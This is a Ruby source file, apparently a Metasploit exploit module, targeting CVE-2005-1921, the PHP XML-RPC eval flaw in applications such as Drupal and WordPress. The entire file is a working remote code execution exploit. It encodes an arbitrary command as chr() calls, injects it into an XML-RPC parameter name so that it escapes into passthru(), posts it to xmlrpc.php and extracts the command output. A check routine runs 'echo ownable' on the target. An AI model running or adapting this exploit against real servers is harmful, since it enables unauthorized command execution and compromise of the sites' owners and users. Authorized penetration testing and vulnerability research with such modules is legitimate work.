require 'msf/core'

module Msf

class Exploits::Unix::Http::PhpXmlrpcEval < Msf::Exploit::Remote

	include Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'PHP XML-RPC Arbitrary Code Execution',
			'Description'    => %q{
                 This module exploits an arbitrary code execution flaw
                 discovered in many implementations of the PHP XML-RPC module.
                 This flaw is exploitable through a number of PHP web
                 applications, including but not limited to Drupal, Wordpress,
                 Postnuke, and TikiWiki.
			},
			'Author'         => [ 'hdm', 'cazz' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
                    ['BID', '14088'],
                    ['CVE', '2005-1921'],
                    ['MIL', '49'],
				],
			'Privileged'     => false,
            'Platform'       => ['unix', 'solaris'],
			'Payload'        => {
                    'Space' => 512,
                    'DisableNops' => true,
                    'Keys'  => ['cmd', 'cmd_bash'],
				},
            'Targets'        => [ ['Automatic', { }], ],
            'DefaultTarget' => 0,
			'DisclosureDate' => 'Jun 29 2005'
            ))


        register_options(
            [
                OptString.new('PATH', [ true,  "Path to xmlrpc.php", '/xmlrpc.php']),
            ], self.class
            )
	end

	def go(command, do_handle = 1)
        c = connect

        encoded = command.unpack("C*").collect{|x| "chr(#{x})"}.join('.')
        wrapper = Rex::Text.rand_text_alphanumeric(rand(128)+32)
        
        cmd = "echo('#{wrapper}'); passthru(#{ encoded }); echo('#{wrapper}');;"

        xml = 
        '<?xml version="1.0"?>' +
        "<methodCall>" +
            "<methodName>"+ Rex::Text.rand_text_alphanumeric(rand(128)+32) + "</methodName>" +
            "<params><param>" +
                "<name>" + Rex::Text.rand_text_alphanumeric(rand(128)+32) + "');#{cmd}//</name>" +
                "<value>" + Rex::Text.rand_text_alphanumeric(rand(128)+32) + "</value>" +
            "</param></params>" +
        "</methodCall>";

        req = c.request({
            'uri'          => datastore['PATH'],
            'method'       => 'POST',
            'Content-Type' => 'application/xml',
            'data'         => xml,
        })

        res = c.send_request(req)

        if do_handle
    		handler
        end

        disconnect

        if (res and res.body)
            b = /#{wrapper}(.*)#{wrapper}/sm.match(res.body)
            if b
                return b.captures[0]
            end
        end

        return nil
	end
    
    def check
        response = go("echo ownable", nil)
        if (response and response =~ /ownable/sm)
            return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end

    def exploit
        response = go(payload.encoded)
        if response == nil
            print_status('exploit failed')
        else 
            print_status("Command returned #{response}")
        end
    end
end	
end
